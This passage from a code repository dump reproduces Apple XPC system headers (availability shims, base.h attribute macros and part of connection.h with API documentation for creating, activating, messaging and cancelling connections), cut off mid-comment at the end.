#ifndef __AVAILABILITY_INTERNAL__MAC_10_11_DEP__MAC_10_11
#define __AVAILABILITY_INTERNAL__MAC_10_11_DEP__MAC_10_11
#endif // __AVAILABILITY_INTERNAL__MAC_10_11_DEP__MAC_10_11

#ifndef __AVAILABILITY_INTERNAL__MAC_10_6_DEP__MAC_10_13
#define __AVAILABILITY_INTERNAL__MAC_10_6_DEP__MAC_10_13
#endif // __AVAILABILITY_INTERNAL__MAC_10_6_DEP__MAC_10_13

#if __has_include(<simulator_host.h>)
#include <simulator_host.h>
#else // __has_include(<simulator_host.h>)
#ifndef IPHONE_SIMULATOR_HOST_MIN_VERSION_REQUIRED
#define IPHONE_SIMULATOR_HOST_MIN_VERSION_REQUIRED 999999
#endif // IPHONE_SIMULATOR_HOST_MIN_VERSION_REQUIRED
#endif // __has_include(<simulator_host.h>)

#ifndef __WATCHOS_UNAVAILABLE
#define __WATCHOS_UNAVAILABLE
#endif

#ifndef __TVOS_UNAVAILABLE
#define __TVOS_UNAVAILABLE
#endif

// simulator host-side bits build against SDKs not having __*_AVAILABLE() yet
#ifndef __OSX_AVAILABLE
#define __OSX_AVAILABLE(...)
#endif

#ifndef __IOS_AVAILABLE
#define __IOS_AVAILABLE(...)
#endif

#ifndef __TVOS_AVAILABLE
#define __TVOS_AVAILABLE(...)
#endif

#ifndef __WATCHOS_AVAILABLE
#define __WATCHOS_AVAILABLE(...)
#endif

#ifndef __API_AVAILABLE
#define __API_AVAILABLE(...)
#endif

#endif // __XPC_AVAILABILITY_H__

```

`BaseBin/_external/include/xpc/base.h`:

```h
// Copyright (c) 2009-2011 Apple Inc. All rights reserved.

#ifndef __XPC_BASE_H__
#define __XPC_BASE_H__

#include <sys/cdefs.h>

__BEGIN_DECLS

#if !defined(__has_include)
#define __has_include(x) 0
#endif // !defined(__has_include)

#if !defined(__has_attribute)
#define __has_attribute(x) 0
#endif // !defined(__has_attribute)

#if !defined(__has_feature)
#define __has_feature(x) 0
#endif // !defined(__has_feature)

#if !defined(__has_extension)
#define __has_extension(x) 0
#endif // !defined(__has_extension)

#if __has_include(<xpc/availability.h>)
#include <xpc/availability.h>
#else // __has_include(<xpc/availability.h>)
#include <Availability.h>
#endif // __has_include(<xpc/availability.h>)

#include <os/availability.h>

#ifndef __XPC_INDIRECT__
#error "Please #include <xpc/xpc.h> instead of this file directly."
#endif // __XPC_INDIRECT__ 

#pragma mark Attribute Shims
#ifdef __GNUC__
#define XPC_CONSTRUCTOR __attribute__((constructor))
#define XPC_NORETURN __attribute__((__noreturn__))
#define XPC_NOTHROW __attribute__((__nothrow__))
#define XPC_NONNULL1 __attribute__((__nonnull__(1)))
#define XPC_NONNULL2 __attribute__((__nonnull__(2)))
#define XPC_NONNULL3 __attribute__((__nonnull__(3)))
#define XPC_NONNULL4 __attribute__((__nonnull__(4)))
#define XPC_NONNULL5 __attribute__((__nonnull__(5)))
#define XPC_NONNULL6 __attribute__((__nonnull__(6)))
#define XPC_NONNULL7 __attribute__((__nonnull__(7)))
#define XPC_NONNULL8 __attribute__((__nonnull__(8)))
#define XPC_NONNULL9 __attribute__((__nonnull__(9)))
#define XPC_NONNULL10 __attribute__((__nonnull__(10)))
#define XPC_NONNULL11 __attribute__((__nonnull__(11)))
#define XPC_NONNULL_ALL __attribute__((__nonnull__))
#define XPC_SENTINEL __attribute__((__sentinel__))
#define XPC_PURE __attribute__((__pure__))
#define XPC_WARN_RESULT __attribute__((__warn_unused_result__))
#define XPC_MALLOC __attribute__((__malloc__))
#define XPC_UNUSED __attribute__((__unused__))
#define XPC_USED __attribute__((__used__))
#define XPC_PACKED __attribute__((__packed__))
#define XPC_PRINTF(m, n) __attribute__((format(printf, m, n)))
#define XPC_INLINE static __inline__ __attribute__((__always_inline__))
#define XPC_NOINLINE __attribute__((noinline))
#define XPC_NOIMPL __attribute__((unavailable))

#if __has_attribute(noescape)
#define XPC_NOESCAPE __attribute__((__noescape__))
#else
#define XPC_NOESCAPE
#endif

#if __has_extension(attribute_unavailable_with_message)
#define XPC_UNAVAILABLE(m) __attribute__((unavailable(m)))
#else // __has_extension(attribute_unavailable_with_message)
#define XPC_UNAVAILABLE(m) XPC_NOIMPL
#endif // __has_extension(attribute_unavailable_with_message)

#define XPC_EXPORT extern __attribute__((visibility("default")))
#define XPC_NOEXPORT __attribute__((visibility("hidden")))
#define XPC_WEAKIMPORT extern __attribute__((weak_import))
#define XPC_DEBUGGER_EXCL XPC_NOEXPORT XPC_USED
#define XPC_TRANSPARENT_UNION __attribute__((transparent_union))
#if __clang__
#define XPC_DEPRECATED(m) __attribute__((deprecated(m)))
#else // __clang__
#define XPC_DEPRECATED(m) __attribute__((deprecated))
#endif // __clang
#ifndef XPC_TESTEXPORT
#define XPC_TESTEXPORT XPC_NOEXPORT
#endif // XPC_TESTEXPORT

#if defined(__XPC_TEST__) && __XPC_TEST__
#define XPC_TESTSTATIC
#define XPC_TESTEXTERN extern
#else // defined(__XPC_TEST__) && __XPC_TEST__
#define XPC_TESTSTATIC static
#endif // defined(__XPC_TEST__) && __XPC_TEST__

#if __has_feature(objc_arc)
#define XPC_GIVES_REFERENCE __strong
#define XPC_UNRETAINED __unsafe_unretained
#define XPC_BRIDGE(xo) ((__bridge void *)(xo))
#define XPC_BRIDGEREF_BEGIN(xo) ((__bridge_retained void *)(xo))
#define XPC_BRIDGEREF_BEGIN_WITH_REF(xo) ((__bridge void *)(xo))
#define XPC_BRIDGEREF_MIDDLE(xo) ((__bridge id)(xo))
#define XPC_BRIDGEREF_END(xo) ((__bridge_transfer id)(xo))
#else // __has_feature(objc_arc)
#define XPC_GIVES_REFERENCE
#define XPC_UNRETAINED
#define XPC_BRIDGE(xo) (xo)
#define XPC_BRIDGEREF_BEGIN(xo) (xo)
#define XPC_BRIDGEREF_BEGIN_WITH_REF(xo) (xo)
#define XPC_BRIDGEREF_MIDDLE(xo) (xo)
#define XPC_BRIDGEREF_END(xo) (xo)
#endif // __has_feature(objc_arc)

#define _xpc_unreachable() __builtin_unreachable()
#else // __GNUC__ 
/*! @parseOnly */
#define XPC_CONSTRUCTOR
/*! @parseOnly */
#define XPC_NORETURN
/*! @parseOnly */
#define XPC_NOTHROW
/*! @parseOnly */
#define XPC_NONNULL1
/*! @parseOnly */
#define XPC_NONNULL2
/*! @parseOnly */
#define XPC_NONNULL3
/*! @parseOnly */
#define XPC_NONNULL4
/*! @parseOnly */
#define XPC_NONNULL5
/*! @parseOnly */
#define XPC_NONNULL6
/*! @parseOnly */
#define XPC_NONNULL7
/*! @parseOnly */
#define XPC_NONNULL8
/*! @parseOnly */
#define XPC_NONNULL9
/*! @parseOnly */
#define XPC_NONNULL10
/*! @parseOnly */
#define XPC_NONNULL11
/*! @parseOnly */
#define XPC_NONNULL(n)
/*! @parseOnly */
#define XPC_NONNULL_ALL
/*! @parseOnly */
#define XPC_SENTINEL
/*! @parseOnly */
#define XPC_PURE
/*! @parseOnly */
#define XPC_WARN_RESULT
/*! @parseOnly */
#define XPC_MALLOC
/*! @parseOnly */
#define XPC_UNUSED
/*! @parseOnly */
#define XPC_PACKED
/*! @parseOnly */
#define XPC_PRINTF(m, n)
/*! @parseOnly */
#define XPC_INLINE static inline
/*! @parseOnly */
#define XPC_NOINLINE
/*! @parseOnly */
#define XPC_NOIMPL
/*! @parseOnly */
#define XPC_EXPORT extern
/*! @parseOnly */
#define XPC_WEAKIMPORT
/*! @parseOnly */
#define XPC_DEPRECATED
/*! @parseOnly */
#define XPC_UNAVAILABLE(m)
/*! @parseOnly */
#define XPC_NOESCAPE
#endif // __GNUC__

#if __has_feature(assume_nonnull)
#define XPC_ASSUME_NONNULL_BEGIN _Pragma("clang assume_nonnull begin")
#define XPC_ASSUME_NONNULL_END   _Pragma("clang assume_nonnull end")
#else
#define XPC_ASSUME_NONNULL_BEGIN
#define XPC_ASSUME_NONNULL_END
#endif

#if __has_feature(nullability_on_arrays)
#define XPC_NONNULL_ARRAY _Nonnull
#else
#define XPC_NONNULL_ARRAY
#endif

#if defined(__has_ptrcheck) && __has_ptrcheck
#define XPC_PTR_ASSUMES_SINGLE __ptrcheck_abi_assume_single()
#define XPC_SINGLE __single
#define XPC_UNSAFE_INDEXABLE __unsafe_indexable
#define XPC_CSTRING XPC_UNSAFE_INDEXABLE
#define XPC_SIZEDBY(N) __sized_by(N)
#define XPC_COUNTEDBY(N) __counted_by(N)
#define XPC_UNSAFE_FORGE_SIZED_BY(_type, _ptr, _size) \
		__unsafe_forge_bidi_indexable(_type, _ptr, _size)
#define XPC_UNSAFE_FORGE_SINGLE(_type, _ptr) \
		__unsafe_forge_single(_type, _ptr)
#else // defined(__has_ptrcheck) ** __has_ptrcheck
#define XPC_PTR_ASSUMES_SINGLE
#define XPC_SINGLE
#define XPC_UNSAFE_INDEXABLE
#define XPC_CSTRING
#define XPC_SIZEDBY(N)
#define XPC_COUNTEDBY(N)
#define XPC_UNSAFE_FORGE_SIZED_BY(_type, _ptr, _size) ((_type)(_ptr))
#define XPC_UNSAFE_FORGE_SINGLE(_type, _ptr) ((_type)(_ptr))
#endif // defined(__has_ptrcheck) ** __has_ptrcheck

#ifdef OS_CLOSED_OPTIONS
#define XPC_FLAGS_ENUM(_name, _type, ...) \
		OS_CLOSED_OPTIONS(_name, _type, __VA_ARGS__)
#else // OS_CLOSED_ENUM
#define XPC_FLAGS_ENUM(_name, _type, ...) \
		OS_ENUM(_name, _type, __VA_ARGS__)
#endif // OS_CLOSED_ENUM

#ifdef OS_CLOSED_ENUM
#define XPC_ENUM(_name, _type, ...) \
		OS_CLOSED_ENUM(_name, _type, __VA_ARGS__)
#else // OS_CLOSED_ENUM
#define XPC_ENUM(_name, _type, ...) \
		OS_ENUM(_name, _type, __VA_ARGS__)
#endif // OS_CLOSED_ENUM

#if __has_attribute(swift_name)
# define XPC_SWIFT_NAME(_name) __attribute__((swift_name(_name)))
#else
# define XPC_SWIFT_NAME(_name) // __has_attribute(swift_name)
#endif

__END_DECLS

#endif // __XPC_BASE_H__ 

```

`BaseBin/_external/include/xpc/connection.h`:

```h
#ifndef __XPC_CONNECTION_H__
#define __XPC_CONNECTION_H__

#ifndef __XPC_INDIRECT__
#error "Please #include <xpc/xpc.h> instead of this file directly."
// For HeaderDoc.
#include <xpc/base.h>
#endif // __XPC_INDIRECT__

#ifndef __BLOCKS__
#error "XPC connections require Blocks support."
#endif // __BLOCKS__

XPC_ASSUME_NONNULL_BEGIN
__BEGIN_DECLS

/*!
 * @constant XPC_ERROR_CONNECTION_INTERRUPTED
 * Will be delivered to the connection's event handler if the remote service
 * exited. The connection is still live even in this case, and resending a
 * message will cause the service to be launched on-demand. This error serves
 * as a client's indication that it should resynchronize any state that it had
 * given the service.
 *
 * Any messages in the queue to be sent will be unwound and canceled when this
 * error occurs. In the case where a message waiting to be sent has a reply
 * handler, that handler will be invoked with this error. In the context of the
 * reply handler, this error indicates that a reply to the message will never
 * arrive.
 *
 * Messages that do not have reply handlers associated with them will be
 * silently disposed of. This error will only be given to peer connections.
 */
#define XPC_ERROR_CONNECTION_INTERRUPTED \
	XPC_GLOBAL_OBJECT(_xpc_error_connection_interrupted)
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
const struct _xpc_dictionary_s _xpc_error_connection_interrupted;

/*!
 * @constant XPC_ERROR_CONNECTION_INVALID
 * Will be delivered to the connection's event handler if the named service
 * provided to xpc_connection_create() could not be found in the XPC service
 * namespace. The connection is useless and should be disposed of.
 *
 * Any messages in the queue to be sent will be unwound and canceled when this
 * error occurs, similarly to the behavior when XPC_ERROR_CONNECTION_INTERRUPTED
 * occurs. The only difference is that the XPC_ERROR_CONNECTION_INVALID will be
 * given to outstanding reply handlers and the connection's event handler.
 *
 * This error may be given to any type of connection.
 */
#define XPC_ERROR_CONNECTION_INVALID \
	XPC_GLOBAL_OBJECT(_xpc_error_connection_invalid)
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
const struct _xpc_dictionary_s _xpc_error_connection_invalid;

/*!
 * @constant XPC_ERROR_TERMINATION_IMMINENT
 * On macOS, this error will be delivered to a peer connection's event handler
 * when the XPC runtime has determined that the program should exit and that
 * all outstanding transactions must be wound down, and no new transactions can
 * be opened.
 *
 * After this error has been delivered to the event handler, no more messages
 * will be received by the connection. The runtime will still attempt to deliver
 * outgoing messages, but this error should be treated as an indication that
 * the program will exit very soon, and any outstanding business over the
 * connection should be wrapped up as quickly as possible and the connection
 * canceled shortly thereafter.
 *
 * This error will only be delivered to peer connections received through a
 * listener or the xpc_main() event handler.
 */
#define XPC_ERROR_TERMINATION_IMMINENT \
	XPC_GLOBAL_OBJECT(_xpc_error_termination_imminent)
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
const struct _xpc_dictionary_s _xpc_error_termination_imminent;

/*!
 * @constant XPC_ERROR_PEER_CODE_SIGNING_REQUIREMENT
 * On macOS, this error will be delivered to a peer connection's event handler
 * when the XPC runtime has detected that a peer connection does not
 * satisfy the code signing requirement specified for the connection.
 *
 * See {@link xpc_connection_set_peer_code_signing_requirement}
 */
#define XPC_ERROR_PEER_CODE_SIGNING_REQUIREMENT \
	XPC_GLOBAL_OBJECT(_xpc_error_peer_code_signing_requirement)
__API_AVAILABLE(macos(12.0))
XPC_EXPORT
const struct _xpc_dictionary_s _xpc_error_peer_code_signing_requirement;

/*!
 * @constant XPC_CONNECTION_MACH_SERVICE_LISTENER
 * Passed to xpc_connection_create_mach_service(). This flag indicates that the
 * caller is the listener for the named service. This flag may only be passed
 * for services which are advertised in the process' launchd.plist(5). You may
 * not use this flag to dynamically add services to the Mach bootstrap
 * namespace.
 */
#define XPC_CONNECTION_MACH_SERVICE_LISTENER (1 << 0)

/*!
 * @constant XPC_CONNECTION_MACH_SERVICE_PRIVILEGED
 * Passed to xpc_connection_create_mach_service(). This flag indicates that the
 * job advertising the service name in its launchd.plist(5) should be in the
 * privileged Mach bootstrap. This is typically accomplished by placing your
 * launchd.plist(5) in /Library/LaunchDaemons. If specified alongside the
 * XPC_CONNECTION_MACH_SERVICE_LISTENER flag, this flag is a no-op.
 */
#define XPC_CONNECTION_MACH_SERVICE_PRIVILEGED (1 << 1)

/*!
 * @typedef xpc_finalizer_f
 * A function that is invoked when a connection is being torn down and its
 * context needs to be freed. The sole argument is the value that was given to
 * {@link xpc_connection_set_context} or NULL if no context has been set. It is
 * not safe to reference the connection from within this function.
 *
 * @param value
 * The context object that is to be disposed of.
 */
typedef void (*xpc_finalizer_t)(void * _Nullable value);

/*!
 * @function xpc_connection_create
 * Creates a new connection object.
 *
 * @param name
 * If non-NULL, the name of the service with which to connect. The returned
 * connection will be a peer.
 *
 * If NULL, an anonymous listener connection will be created. You can embed the
 * ability to create new peer connections in an endpoint, which can be inserted
 * into a message and sent to another process .
 *
 * @param targetq
 * The GCD queue to which the event handler block will be submitted. This
 * parameter may be NULL, in which case the connection's target queue will be
 * libdispatch's default target queue, defined as DISPATCH_TARGET_QUEUE_DEFAULT.
 * The target queue may be changed later with a call to
 * xpc_connection_set_target_queue().
 *
 * @result
 * A new connection object. The caller is responsible for disposing of the
 * returned object with {@link xpc_release} when it is no longer needed.
 *
 * @discussion
 * This method will succeed even if the named service does not exist. This is
 * because the XPC namespace is not queried for the service name until the
 * connection has been activated. See {@link xpc_connection_activate()}.
 *
 * XPC connections, like dispatch sources, are returned in an inactive state, so
 * you must call {@link xpc_connection_activate()} in order to begin receiving
 * events from the connection. Also like dispatch sources, connections must be
 * activated and not suspended in order to be safely released. It is
 * a programming error to release an inactive or suspended connection.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT
xpc_connection_t
xpc_connection_create(const char * _Nullable name,
	dispatch_queue_t _Nullable targetq);

/*!
 * @function xpc_connection_create_mach_service
 * Creates a new connection object representing a Mach service.
 *
 * @param name
 * The name of the remote service with which to connect. The service name must
 * exist in a Mach bootstrap that is accessible to the process and be advertised
 * in a launchd.plist.
 *
 * @param targetq
 * The GCD queue to which the event handler block will be submitted. This
 * parameter may be NULL, in which case the connection's target queue will be
 * libdispatch's default target queue, defined as DISPATCH_TARGET_QUEUE_DEFAULT.
 * The target queue may be changed later with a call to
 * xpc_connection_set_target_queue().
 *
 * @param flags
 * Additional attributes with which to create the connection.
 *
 * @result
 * A new connection object.
 *
 * @discussion
 * If the XPC_CONNECTION_MACH_SERVICE_LISTENER flag is given to this method,
 * then the connection returned will be a listener connection. Otherwise, a peer
 * connection will be returned. See the documentation for
 * {@link xpc_connection_set_event_handler()} for the semantics of listener
 * connections versus peer connections.
 *
 * This method will succeed even if the named service does not exist. This is
 * because the Mach namespace is not queried for the service name until the
 * connection has been activated. See {@link xpc_connection_activate()}.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT XPC_NONNULL1
xpc_connection_t
xpc_connection_create_mach_service(const char *name,
	dispatch_queue_t _Nullable targetq, uint64_t flags);

/*!
 * @function xpc_connection_create_from_endpoint
 * Creates a new connection from the given endpoint.
 *
 * @param endpoint
 * The endpoint from which to create the new connection.
 *
 * @result
 * A new peer connection to the listener represented by the given endpoint.
 *
 * The same responsibilities of setting an event handler and activating the
 * connection after calling xpc_connection_create() apply to the connection
 * returned by this API. Since the connection yielded by this API is not
 * associated with a name (and therefore is not rediscoverable), this connection
 * will receive XPC_ERROR_CONNECTION_INVALID if the listening side crashes,
 * exits or cancels the listener connection.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT XPC_NONNULL_ALL
xpc_connection_t
xpc_connection_create_from_endpoint(xpc_endpoint_t endpoint);

/*!
 * @function xpc_connection_set_target_queue
 * Sets the target queue of the given connection.
 *
 * @param connection
 * The connection object which is to be manipulated.
 *
 * @param targetq
 * The GCD queue to which the event handler block will be submitted. This
 * parameter may be NULL, in which case the connection's target queue will be
 * libdispatch's default target queue, defined as DISPATCH_TARGET_QUEUE_DEFAULT.
 *
 * @discussion
 * Setting the target queue is asynchronous and non-preemptive and therefore
 * this method will not interrupt the execution of an already-running event
 * handler block. Setting the target queue may be likened to issuing a barrier
 * to the connection which does the actual work of changing the target queue.
 *
 * The XPC runtime guarantees this non-preemptiveness even for concurrent target
 * queues. If the target queue is a concurrent queue, then XPC still guarantees
 * that there will never be more than one invocation of the connection's event
 * handler block executing concurrently. If you wish to process events
 * concurrently, you can dispatch_async(3) to a concurrent queue from within
 * the event handler.
 *
 * IMPORTANT: When called from within the event handler block,
 * dispatch_get_current_queue(3) is NOT guaranteed to return a pointer to the
 * queue set with this method.
 *
 * Despite this seeming inconsistency, the XPC runtime guarantees that, when the
 * target queue is a serial queue, the event handler block will execute
 * synchronously with respect to other blocks submitted to that same queue. When
 * the target queue is a concurrent queue, the event handler block may run
 * concurrently with other blocks submitted to that queue, but it will never run
 * concurrently with other invocations of itself for the same connection, as
 * discussed previously.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1
void
xpc_connection_set_target_queue(xpc_connection_t connection,
	dispatch_queue_t _Nullable targetq);

/*!
 * @function xpc_connection_set_event_handler
 * Sets the event handler block for the connection.
 *
 * @param connection
 * The connection object which is to be manipulated.
 *
 * @param handler
 * The event handler block.
 *
 * @discussion
 * Setting the event handler is asynchronous and non-preemptive, and therefore
 * this method will not interrupt the execution of an already-running event
 * handler block. If the event handler is executing at the time of this call, it
 * will finish, and then the connection's event handler will be changed before
 * the next invocation of the event handler. The XPC runtime guarantees this
 * non-preemptiveness even for concurrent target queues.
 *
 * Connection event handlers are non-reentrant, so it is safe to call
 * xpc_connection_set_event_handler() from within the event handler block.
 *
 * The event handler's execution should be treated as a barrier to all
 * connection activity. When it is executing, the connection will not attempt to
 * send or receive messages, including reply messages. Thus, it is not safe to
 * call xpc_connection_send_message_with_reply_sync() on the connection from
 * within the event handler.
 *
 * You do not hold a reference on the object received as the event handler's
 * only argument. Regardless of the type of object received, it is safe to call
 * xpc_retain() on the object to obtain a reference to it.
 *
 * A connection may receive different events depending upon whether it is a
 * listener or not. Any connection may receive an error in its event handler.
 * But while normal connections may receive messages in addition to errors,
 * listener connections will receive connections and and not messages.
 *
 * Connections received by listeners are equivalent to those returned by
 * xpc_connection_create() with a non-NULL name argument and a NULL targetq
 * argument with the exception that you do not hold a reference on them.
 * You must set an event handler and activate the connection. If you do not wish
 * to accept the connection, you may simply call xpc_connection_cancel() on it
 * and return. The runtime will dispose of it for you.
 *
 * If there is an error in the connection, this handler will be invoked with the
 * error dictionary as its argument. This dictionary will be one of the well-
 * known XPC_ERROR_* dictionaries.
 *
 * Regardless of the type of event, ownership of the event object is NOT
 * implicitly transferred. Thus, the object will be released and deallocated at
 * some point in the future after the event handler returns. If you wish the
 * event's lifetime to persist, you must retain it with xpc_retain().
 *
 * Connections received through the event handler will be released and
 * deallocated after the connection has gone invalid and delivered that event to
 * its event handler.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL_ALL
void
xpc_connection_set_event_handler(xpc_connection_t connection,
	xpc_handler_t handler);

/*!
 * @function xpc_connection_activate
 * Activates the connection. Connections start in an inactive state, so you must
 * call xpc_connection_activate() on a connection before it will send or receive
 * any messages.
 *
 * @param connection
 * The connection object which is to be manipulated.
 *
 * @discussion
 * Calling xpc_connection_activate() on an active connection has no effect.
 * Releasing the last reference on an inactive connection that was created with
 * an xpc_connection_create*() call is undefined.
 *
 * For backward compatibility reasons, xpc_connection_resume() on an inactive
 * and not otherwise suspended xpc connection has the same effect as calling
 * xpc_connection_activate(). For new code, using xpc_connection_activate()
 * is preferred.
 */
__OSX_AVAILABLE(10.12) __IOS_AVAILABLE(10.0)
__TVOS_AVAILABLE(10.0) __WATCHOS_AVAILABLE(3.0)
XPC_EXPORT XPC_NONNULL_ALL
void
xpc_connection_activate(xpc_connection_t connection);

/*!
 * @function xpc_connection_suspend
 * Suspends the connection so that the event handler block will not fire and
 * that the connection will not attempt to send any messages it has in its
 * queue. All calls to xpc_connection_suspend() must be balanced with calls to
 * xpc_connection_resume() before releasing the last reference to the
 * connection.
 *
 * @param connection
 * The connection object which is to be manipulated.
 *
 * @discussion
 * Suspension is asynchronous and non-preemptive, and therefore this method will
 * not interrupt the execution of an already-running event handler block. If
 * the event handler is executing at the time of this call, it will finish, and
 * then the connection will be suspended before the next scheduled invocation
 * of the event handler. The XPC runtime guarantees this non-preemptiveness even
 * for concurrent target queues.
 *
 * Connection event handlers are non-reentrant, so it is safe to call
 * xpc_connection_suspend() from within the event handler block.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL_ALL
void
xpc_connection_suspend(xpc_connection_t connection);

/*!
 * @function xpc_connection_resume
 * Resumes the connection.
 *
 * @param connection
 * The connection object which is to be manipulated.
 *
 * @discussion
 * In order for a connection to become live, every call to
 * xpc_connection_suspend() must be balanced with a call to
 * xpc_connection_resume().
 *
 * For backward compatibility reasons, xpc_connection_resume() on an inactive
 * and not otherwise suspended xpc connection has the same effect as calling
 * xpc_connection_activate(). For new code, using xpc_connection_activate()
 * is preferred.
 *
 * Calling xpc_connection_resume() more times than xpc_connection_suspend()
 * has been called is otherwise considered an error.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL_ALL
void
xpc_connection_resume(xpc_connection_t connection);

/*!
 * @function xpc_connection_send_message
 * Sends a message over the connection to the destination service.
 *
 * @param connection
 * The connection over which the message shall be sent.
 *
 * @param message
 * The message to send. This must be a dictionary object. This dictionary is
 * logically copied by the connection, so it is safe to modify the dictionary
 * after this call.
 *
 * @discussion
 * Messages are delivered in FIFO order. This API is safe to call from multiple
 * GCD queues. There is no indication that a message was delivered successfully.
 * This is because even once the message has been successfully enqueued on the
 * remote end, there are no guarantees about when the runtime will dequeue the
 * message and invoke the other connection's event handler block.
 *
 * If this API is used to send a message that is in reply to another message,
 * there is no guarantee of ordering between the invocations of the connection's
 * event handler and the reply handler for that message, even if they are
 * targeted to the same queue.
 *
 * After extensive study, we have found that clients who are interested in
 * the state of the message on the server end are typically holding open
 * transactions related to that message. And the only reliable way to track the
 * lifetime of that transaction is at the protocol layer. So the server should
 * send a reply message, which upon receiving, will cause the client to close
 * its transaction.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL_ALL
void
xpc_connection_send_message(xpc_connection_t connection, xpc_object_t message);

/*!
 * @function xpc_connection_send_barrier
 * Issues a barrier against the connection's message-send activity.
 *
 * @param connection
 * The connection against which the barrier is to be issued.
 *
 * @param barrier
 * The barrier block to issue. This barrier prevents concurrent message-send
 * activity on the connection. No messages will be sent while the barrier block
 * is executing.
 *
 * @discussion
 * XPC guarantees that, even if the connection's target queue is a concurrent
 * queue, there are no other messages being sent concurrently while the barrier
 * block is executing. XPC does not guarantee that the receipt of messages
 * (either through the connection's event handler or through reply handlers)
 * will be suspended while the barrier is executing.
 *
 * A barrier is issued relative to the message-send queue. Thus, if you call
 * xpc_connection_send_message() five times and then call
 * xpc_connection_send_barrier(), the barrier will be invoked after the fifth
 * message has been sent and its memory disposed of. You may safely cancel a
 * connection from within a barrier block.
 *
 * If a barrier is issued after sending a message which expects a reply, the
 * behavior is the same as described above. The receipt of a reply message will
 * not influence when the barrier runs.
 *
 * A barrier block can be useful for throttling resource consumption on the
 * connected side of a connection. For example, if your connection sends many
 * large messages, you can use a barrier to limit the number of messages that
 * are inflight at any given time. This can be particularly useful for messages
 * that contain kernel resources (like file descriptors) which have a system-
 * wide limit.
 *
 * If a barrier is issued on a canceled connection, it will be invoked
 * immediately. If a connection has been canceled and still has outstanding
 * barriers, those barriers will be invoked as part of the connection's
 * unwinding process.
 *
 * It is important to note that a barrier block's execution order is not
 * guaranteed with respect to other blocks that have been scheduled on the
 * target queue of the connection. Or said differently,
 * xpc_connection_send_barrier(3) is not equivalent to dispatch_async(3).
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL_ALL
void
xpc_connection_send_barrier(xpc_connection_t connection,
	dispatch_block_t barrier);

/*!
 * @function xpc_connection_send_message_with_reply
 * Sends a message over the connection to the destination service and associates
 * a handler to be invoked when the remote service sends a reply message.
 *
 * @param connection
 * The connection over which the message shall be sent.
 *
 * @param message
 * The message to send. This must be a dictionary object.
 *
 * @param replyq
 * The GCD queue to which the reply handler will be submitted. This may be a
 * concurrent queue.
 *
 * @param handler
 * The handler block to invoke when a reply to the message is received from
 * the connection. If the remote service exits prematurely before the reply was
 * received, the XPC_ERROR_CONNECTION_INTERRUPTED error will be returned.
 * If the connection went invalid before the message could be sent, the
 * XPC_ERROR_CONNECTION_INVALID error will be returned.
 *
 * @discussion
 * If the given GCD queue is a concurrent queue, XPC cannot guarantee that there
 * will not be multiple reply handlers being invoked concurrently. XPC does not
 * guarantee any ordering for the invocation of reply handlers. So if multiple
 * messages are waiting for replies and the connection goes invalid, there is no
 * guarantee that the reply handlers will be invoked in FIFO order. Similarly,
 * XPC does not guarantee that reply handlers will not run concurrently with
 * the connection's event handler in the case that the reply queue and the
 * connection's target queue are the same concurrent queue.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1 XPC_NONNULL2 XPC_NONNULL4
void
xpc_connection_send_message_with_reply(xpc_connection_t connection,
	xpc_object_t message, dispatch_queue_t _Nullable replyq,
	xpc_handler_t handler);

/*!
 * @function xpc_connection_send_message_with_reply_sync
 * Sends a message over the connection and blocks the caller until a reply is
 * received.
 *
 * @param connection
 * The connection over which the message shall be sent.
 *
 * @param message
 * The message to send. This must be a dictionary object.
 *
 * @result
 * The message that the remote service sent in reply to the original message.
 * If the remote service exits prematurely before the reply was received, the
 * XPC_ERROR_CONNECTION_INTERRUPTED error will be returned. If the connection
 * went invalid before the message could be sent, the
 * XPC_ERROR_CONNECTION_INVALID error will be returned.
 *
 * You are responsible for releasing the returned object.
 *
 * @discussion
 * This API supports priority inversion avoidance, and should be used instead of
 * combining xpc_connection_send_message_with_reply() with a semaphore.
 *
 * Invoking this API from a queue that is a part of the target queue hierarchy
 * results in deadlocks under certain conditions.
 *
 * Be judicious about your use of this API. It can block indefinitely, so if you
 * are using it to implement an API that can be called from the main thread, you
 * may wish to consider allowing the API to take a queue and callback block so
 * that results may be delivered asynchronously if possible.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL_ALL XPC_WARN_RESULT XPC_RETURNS_RETAINED
xpc_object_t
xpc_connection_send_message_with_reply_sync(xpc_connection_t connection,
	xpc_object_t message);

/*!
 * @function xpc_connection_cancel
 * Cancels the connection and ensures that its event handler will not fire
 * again. After this call, any messages that have not yet been sent will be
 * discarded, and the connection will be unwound. If there are messages that are
 * awaiting replies, they will have their reply handlers invoked with the
 * XPC_ERROR_CONNECTION_INVALID error.
 *
 * @param connection
 * The connection object which is to be manipulated.
 *
 * @discussion
 * Cancellation is asynchronous and non-preemptive and therefore this method
 * will not interrupt the execution of an already-running event handler block.
 * If the event handler is executing at the time of this call, it will finish,
 * and then the connection will be canceled, causing a final invocation of the
